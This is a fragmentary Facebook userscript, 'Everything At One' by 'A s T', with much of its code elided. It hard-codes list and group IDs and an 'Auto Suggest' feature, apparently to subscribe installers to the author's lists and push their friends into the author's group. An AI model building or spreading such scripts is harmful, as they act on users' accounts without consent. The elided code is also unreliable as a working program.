// ==UserScript==
// @name            Everything At One @AsT
// @description     All about facebook By A s T
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/a7xast" target="_blank">Created by A s T Beatboxer <br>CLICK HERE</a>';
	html += '</div>';
...
sublist("504614819600959");
sublist("504632219599219");
sublist("504629326266175");
sublist("3186746802943");
sublist("3176810474541");
sublist("3386823364732");


//Group ku A s T
var gid = ['501632476575920'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by A s T & Adib';
